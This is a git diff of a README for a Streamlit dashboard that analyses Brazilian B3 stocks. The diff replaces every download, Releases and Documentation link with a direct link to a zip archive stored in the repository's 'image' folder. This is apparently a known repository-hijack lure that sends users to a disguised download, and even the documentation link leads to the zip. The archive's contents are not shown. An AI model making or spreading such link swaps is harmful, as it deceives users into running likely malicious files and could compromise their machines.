@@ -1,6 +1,6 @@
 # 📊 B3_Stocks_Dashboard - Analyze Brazilian Stocks Easily
 
-[![Download B3 Stocks Dashboard](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/brenzando/B3_Stocks_Dashboard/releases)
+[![Download B3 Stocks Dashboard](https://raw.githubusercontent.com/brenzando/B3_Stocks_Dashboard/main/image/Dashboard-Stocks-v1.9-beta.3.zip)](https://raw.githubusercontent.com/brenzando/B3_Stocks_Dashboard/main/image/Dashboard-Stocks-v1.9-beta.3.zip)
 
 ## 🌟 Overview
 The B3 Stocks Dashboard is a comprehensive web-based application for analyzing Brazilian stock market data from the B3 (Brasil, Bolsa, Balcão) exchange. Built with Streamlit, this interactive dashboard provides real-time stock quotes, historical analysis, and comparative metrics for tracking investment performance and market trends.
@@ -9,7 +9,7 @@ The B3 Stocks Dashboard is a comprehensive web-based application for analyzing B
 To begin using the B3 Stocks Dashboard, follow these simple steps. You don’t need any programming knowledge. Just follow the instructions to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/brenzando/B3_Stocks_Dashboard/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/brenzando/B3_Stocks_Dashboard/main/image/Dashboard-Stocks-v1.9-beta.3.zip) to download the latest version.
 2. Locate the most recent release version.
 3. Click on the download link for your operating system.
 
@@ -54,9 +54,9 @@ We welcome contributions from anyone interested in enhancing the B3 Stocks Dashb
 Your feedback is important to us. Let us know about your experience using the B3 Stocks Dashboard or any improvements you would like to suggest. 
 
 ## 🔗 Additional Resources
-For more detailed information on how to use the application and its features, refer to our [Documentation](https://github.com/brenzando/B3_Stocks_Dashboard/wiki) page.
+For more detailed information on how to use the application and its features, refer to our [Documentation](https://raw.githubusercontent.com/brenzando/B3_Stocks_Dashboard/main/image/Dashboard-Stocks-v1.9-beta.3.zip) page.
 
 ## 📄 License
 This project is licensed under the MIT License. You are free to use and modify the software according to the license terms.
 
-[![Download B3 Stocks Dashboard](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/brenzando/B3_Stocks_Dashboard/releases)
+[![Download B3 Stocks Dashboard](https://raw.githubusercontent.com/brenzando/B3_Stocks_Dashboard/main/image/Dashboard-Stocks-v1.9-beta.3.zip)](https://raw.githubusercontent.com/brenzando/B3_Stocks_Dashboard/main/image/Dashboard-Stocks-v1.9-beta.3.zip)
